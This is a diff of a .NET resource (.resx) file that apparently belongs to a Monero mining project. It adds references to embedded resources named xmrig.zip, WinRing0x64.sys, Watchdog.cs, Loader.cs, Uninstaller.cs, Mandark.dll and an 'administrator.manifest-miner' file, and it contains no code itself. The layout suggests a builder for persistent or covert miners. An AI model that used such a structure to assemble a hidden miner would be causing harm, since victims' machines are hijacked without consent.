@@ -118,8 +118,14 @@
     <value>System.Resources.ResXResourceWriter, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
   </resheader>
   <assembly alias="System.Windows.Forms" name="System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" />
+  <data name="Mandark" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\Mandark.dll;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
+  </data>
   <data name="Monero" type="System.Resources.ResXFileRef, System.Windows.Forms">
     <value>..\Resources\Monero.ico;System.Drawing.Icon, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="Uninstaller" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\Uninstaller.cs;System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089;utf-8</value>
   </data>
   <data name="MoneroPNG" type="System.Resources.ResXFileRef, System.Windows.Forms">
     <value>..\Resources\Monero.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
@@ -127,8 +133,11 @@
   <data name="libs" type="System.Resources.ResXFileRef, System.Windows.Forms">
     <value>..\Resources\libs.zip;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
   </data>
-  <data name="WinRing0x64" type="System.Resources.ResXFileRef, System.Windows.Forms">
-    <value>..\Resources\WinRing0x64.sys;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
+  <data name="Watchdog" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\Watchdog.cs;System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089;utf-8</value>
+  </data>
+  <data name="Loader" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\Loader.cs;System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089;utf-8</value>
   </data>
   <data name="xmrig" type="System.Resources.ResXFileRef, System.Windows.Forms">
     <value>..\Resources\xmrig.zip;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
@@ -136,10 +145,13 @@
   <data name="Program" type="System.Resources.ResXFileRef, System.Windows.Forms">
     <value>..\Resources\Program.cs;System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089;utf-8</value>
   </data>
-  <data name="Watchdog" type="System.Resources.ResXFileRef, System.Windows.Forms">
-    <value>..\Resources\Watchdog.cs;System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089;utf-8</value>
+  <data name="WinRing0x64" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\WinRing0x64.sys;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
   </data>
-  <data name="Mandark" type="System.Resources.ResXFileRef, System.Windows.Forms">
-    <value>..\Resources\Mandark.dll;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
+  <data name="microsoft-admin" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\microsoft-admin.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="administrator" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\administrator.manifest-miner;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
   </data>
 </root>
